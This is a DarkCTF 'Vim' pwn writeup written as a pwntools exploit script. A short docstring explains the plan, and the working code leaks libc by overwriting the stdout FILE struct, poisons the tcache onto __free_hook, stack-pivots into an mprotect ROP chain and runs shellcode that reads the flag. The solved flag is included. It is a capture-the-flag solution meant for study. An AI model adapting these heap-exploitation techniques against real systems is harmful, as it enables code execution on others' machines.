"""
DarkCTF `Vim` Writeup
Pwn

Fairly standard heap challenge interface, but the view and edit commands don't work. We'll need to
be clever about getting a leak. Thankfully we have an almost arbitrarily large overflow when we request a chunk.
The binary only uses the lower 8 bits when allocating chunks, but allows the user to write the full 32 bits of 
size. So requesting an 0x118 byte note will allocate an 0x20 sized chunk, but let you write 0x118 bytes to it.

The plan is as follows:
1) Leak libc, by overwriting certain values in the stdout filestream handle (_IO_2_1_stdout_)
    a) Use the overflow to free an overlapping chunk into the unsorted bin, remainder until it's fd pointer 
       overlap another chunk in the tcache
    b) Use overflow again to overwrite the 2 LSB's of that pointer to "0x?760". This will be the address of
       the _IO_2_1_stdout_ struct, as it is at a constant offset. The "?" represents that we need to guess
       4 bits of ASLR
    c) Allocate chunk out of the tcache, and overwrite LSB of write_base pointer (also set flags accordingly)
       This will cause the next call to print to need to "catchup", and it will end up printing part of the
       file stream structure itself, leaking libc addresses (see https://vigneshsrao.github.io/babytcache/)
2) Gain control of RIP by overwriting the malloc free hook. The binary sets up seccomp, meaning we can't just
   overwtite that with system. Thankfully mprotect is allowed
    a) Overwrite the free hook with the address of an ADD RSP; RET gadget. Also put a ROP chain and shellcode
       in the same area.
    b) Use hidden "sign guest book" option to place a POP RSP; RET gadget on the stack. The ADD RSP; RET gadget
       at the free hook pivots the stack here, and this then pivots it back to the rop chain we just wrote
    c) ROP chain call mprotect on the page the free hook (and shellcode) is in, and jumps control there
    d) Shellcode opens "/home/ctf/flag", reads it into memory, and then writes it back to stdout
3) Loop the above until it works (we need to brute force 4 bits of ASLR, meaning this will only work 1/16 times)

More details in exploit()
"""

from pwn import *

binary_path = "./vim"

# Offsets for using provided libc
lib_path = "./lib/"
LIBC_LEAK_OFFSET = 0x3ec7e3

ADD_RSP_RET = 0x00000000000405af
POP_RSP_RET = 0x0000000000003960

POP_RDI_RET = 0x000000000002155f
POP_RSI_RET = 0x0000000000023e8a
POP_RDX_RET = 0x0000000000001b96 

# Offsets for using version w/ debug symbols
# lib_path = "/home/kali/Desktop/HeapLAB/.glibc/glibc_2.27/"
# LIBC_LEAK_OFFSET = 0x3af7e3
# 
# ADD_RSP_RET = 0x00000000000762a6
# POP_RSP_RET = 0x0000000000003960
# 
# POP_RDI_RET = 0x000000000002144f
# POP_RSI_RET = 0x0000000000021e22
# POP_RDX_RET = 0x0000000000001b96

#=Boilerplate=================================================================#

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""

contextwatch execute "vis"

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
    .above(of="main", display="expressions", size="75%")
    .left(of="expressions", display="regs", size="35%")
    .above(of="regs", display="disasm")
    .above(of="disasm", display="stack")
).build(nobanner=True)
end

continue
"""
def start():
    global notes

    notes = [False, False, False, False, False]

    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc vim.darkarmy.xyz 32768
        return remote("vim.darkarmy.xyz", 32768)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


#=Menu Interaction============================================================#

notes = [False, False, False, False, False]


def write_note(io, content="", size=None, clean=True):
    global notes

    if size is None:
        size = len(content)


    io.sendline("1")

    io.recvuntil("chunk: ")
    io.sendline(f"{size}")

    io.recvuntil("note: ")
    io.sendline(content)

    if clean:
        io.recvuntil("Choice: ")
        io.clean()

    for i in range(len(notes)):
        if not notes[i]:
            notes[i] = True
            return i
    raise Error("Out of notes")


def free_note(io, idx, clean=True):
    global notes
    io.sendline("2")

    io.recvuntil("index: ")
    io.sendline(f"{idx}")

    if clean:
        io.recvuntil("Choice: ")
        io.clean()

    notes[idx] = False


def sign_name(io, content):
    io.sendline("4919")
    io.recvuntil("book: ")
    io.sendline(content)

    io.recvuntil("Choice: ")
    io.clean()


#=Exploit=====================================================================#

def exploit(io):
    # Set up free chunks in the right places
    A = write_note(io, size=0x18)
    B = write_note(io, size=0x77)
    C = write_note(io, size=0x67)
    D = write_note(io, size=0x48)
    
    free_note(io, D)
    free_note(io, C)
    free_note(io, A)
    
    # Overwrite the size of chunk B, (and make fake chunks after it) so we can free it into the unsorted bin
    A2 = write_note(io, size=0x1018, content=flat({
        0x18: p64(0x501),
        0x518:p64(0x21),
        0x538:p64(0x21)
    }))
    
    free_note(io, A2)
    free_note(io, B)
    
    # Remainder chunks off until the fd and bk pointers overlap with chunk D's fd and bk pointers
    B2 = write_note(io, size=0x77)
    C2 = write_note(io, size=0x28)
    C2_1 = write_note(io, size=0x38)
    
    free_note(io, B2)
    free_note(io, C2)
    free_note(io, C2_1)
  
    # Overwrite tcache pointer with address of _IO_2_1_stdout_ (subject ot ASLR)
    stdout_overwrite = 0x8760
    if args.GDB:
        stdout_overwrite = 0x3760 # If GDB assume ASLR is turned off 
    A3 = write_note(io, size=0x112, content=flat({
        0x18: p64(0x501),
        0x110: p16(stdout_overwrite)
    }))

    # Re-allocate D. Next chunk allocated of this size will (hopefully) overwrite the file stream struct
    D2 = write_note(io, size=0x48)
    
    # Make sure we flush the receive buffer so the leak will be at a predictable offset
    io.clean() 
   
    # Overwrite the file stream fields.
    STDOUT_CHUNK = write_note(io, size=0x48, clean=False, content=flat({
        0x00: p64(0xfbad1800),
        0x08: p64(0x0) * 3, # We use the terminating new line to overwrite the LSB of the write_base pointer
    }))
   
    # We are expecting the above to cause a leak of around 0xc bytes. If we didn't get that, we got the ASLR
    # wrong and need to try again
    leak = io.recvuntil("Choice: ")
    if len(leak) < 0x60: 
        raise Error("false alarm")

    # Pull libc from a pointer in the _IO_2_1_stdout_ struct we just leaked
    libc_leak = u64(leak[0x86: 0x86 + 8])
    libc.address = libc_leak - LIBC_LEAK_OFFSET
    print(f"LIBC: {hex(libc.address)}")

    free_hook_addr = libc.sym.__free_hook
    free_hook_page = free_hook_addr & 0xfffffffffffff000

    # Shellcode opens, reads, and writes a file to stdout
    shellcode= asm(f"""
        xor rax, rax
        mov al, 0x2
        xor rsi, rsi
        xor rdx, rdx
        mov rdi, {free_hook_addr + 0x8}
        syscall
        mov rdi, rax
        xor rax, rax
        mov rsi, {free_hook_addr + 0x100}
        mov rdx, 0x100
        syscall
        mov rax, 0x1
        mov rdi, rax
        syscall
        mov rax, 0x3c
        xor rdi, rdi
        syscall
    """)
    shellcode_addr = free_hook_addr + 0x78

    # ROP chain calls mprotect on page with free hook (and shellcode), then jumps to that shellcode
    rop_chain = \
        p64(POP_RDI_RET + libc.address) + \
        p64(free_hook_page) + \
        p64(POP_RSI_RET + libc.address) + \
        p64(0x1000) + \
        p64(POP_RDX_RET + libc.address) + \
        p64(0x1 | 0x2 | 0x4) + \
        p64(libc.sym.mprotect) + \
        p64(shellcode_addr)
    rop_chain_addr = free_hook_addr + 0x18

    # Overwrite tcache pointer of chunk B2 to point to free hook
    free_note(io, A3)
    A4 = write_note(io, size=0x1018, content=flat({
        0x20: p64(libc.sym.__free_hook)
    }))

    # Allocate out the poisoned tcache chunk, using overflow to write the rop chain and shellcode as well
    B3 = write_note(io, size=0x77)
    FREE_HOOK_CHUNK = write_note(io, size=0x1077, content=flat({
        0x000: p64(ADD_RSP_RET + libc.address),
        0x008: "/home/ctf/flag\0",
        0x018: rop_chain,
        0x078: shellcode
    }, filler=b"\0"))

    # Set up pivot back to our ROP chain
    pivot_chain = p64(POP_RSP_RET + libc.address) + p64(rop_chain_addr)
    sign_name(io, pivot_chain)

    # Trigger our shellcode. The flow of execution is
    # 1) free() calls __free_hook, which in this case adds a value to RSP and returns
    # 2) RSP now points to the POP RSP gadget we entered in the "record book". This pops us back to down to the
    #    rop chain we placed right below the free hook
    # 3) ROP chain call mprotect, which sets the area of memory as executable, and the jumps to the shellcode
    # 4) Shellcode opens "/home/ctf/flag", reads it into memory, and then writes it to stdout
    free_note(io, A4, clean=False)
    flag = io.recvline()

    return flag


if args.GDB:
    io = start()
    flag = exploit(io)
    print(f"FLAG: {flag}")
else:
    running = True
    while running:
        io = start()
        try:
            print("*** STARTING EXPLOIT ***")
            flag = exploit(io)
            print(flag)
            running = False
        except (KeyboardInterrupt, SystemExit):
            print("*** GOODBYE ***")
            raise
        except:
            print("*** ALSR WRONG ***")
            io.close()

# darkCTF{Std0U7_L3aK/i5_JuST_pure_m4gIc}
